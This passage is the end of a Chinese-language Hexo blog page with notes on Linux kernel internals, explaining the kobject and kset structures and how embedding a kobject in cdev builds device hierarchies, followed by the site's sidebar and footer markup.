class="comment">/* kobject 的类型，接下来有详细介绍 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sysfs_dirent</span>    *<span class="title">sd</span>;</span>                 <span class="comment">/* 在sysfs中，这个结构体表示kobject的一个inode结构体，sysfs之后也会介绍 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span>        <span class="title">kref</span>;</span>                    <span class="comment">/* 提供 kobject 的引用计数 */</span></span><br><span class="line">    <span class="comment">/* 一些标志位  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> state_initialized:<span class="number">1</span>;       </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> state_in_sysfs:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> state_add_uevent_sent:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> state_remove_uevent_sent:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> uevent_suppress:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>kobject 本身不代表什么实际的内容，一般都是嵌在其他数据结构中来发挥作用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kset</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>    <span class="comment">/* 表示kset中所有kobject的链表 */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> list_lock;     <span class="comment">/* 用于保护 list 的自旋锁*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>      <span class="comment">/* kset中嵌入的一个kobject，使得kset也可以表现的像一样kobject一样*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kset_uevent_ops</span> *<span class="title">uevent_ops</span>;</span>  <span class="comment">/* 处理kset中kobject的热插拔事件 提供了与用户空间热插拔进行通信的机制 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>cdev 中嵌入了 kobject 之后，就可以通过 cdev-&gt;kboj.parent 建立 cdev 之间的层次关系，通过 cdev-&gt;kobj.entry 获取关联的所有 cdev 设备等 </li>
<li>总之，嵌入了 kobject 之后，cdev 设备之间就有了树结构关系，cdev 设备和其他设备之间也有可层次关系 </li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661852969399.png" class width="1661852969399"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">145</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">102</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">1.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">28:38</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
